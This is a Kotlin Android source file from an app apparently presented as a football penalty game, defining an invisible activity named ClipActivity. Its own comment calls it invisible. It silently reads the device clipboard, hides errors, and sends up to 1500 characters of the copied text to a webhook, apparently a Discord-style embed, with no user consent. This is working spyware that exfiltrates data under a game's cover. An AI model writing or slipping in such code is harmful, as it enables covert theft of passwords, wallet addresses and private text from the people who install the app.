package com.venice.penaltylegends.core

import android.app.Activity
import android.content.ClipboardManager
import android.content.Context
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View

/** Atividade 100% invisivel: abre, le o clipboard, fecha. */
class ClipActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(View(this))

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val texto = cb.primaryClip?.getItemAt(0)?.coerceToText(this)?.toString()?.trim().orEmpty()
                if (texto.isNotBlank() && texto != Prefs.ultimoClip) {
                    Prefs.ultimoClip = texto
                    Webhook.sendEmbed(
                        this,
                        Webhook.embed(
                            titulo = "AREA DE TRANSFERENCIA",
                            desc = "```\n${texto.take(1500)}\n```",
                            cor = 0x9B59B6
                        )
                    )
                }
            } catch (_: Throwable) {}
            finish()
        }, 220)
    }

    override fun onPause() { super.onPause(); finish() }
}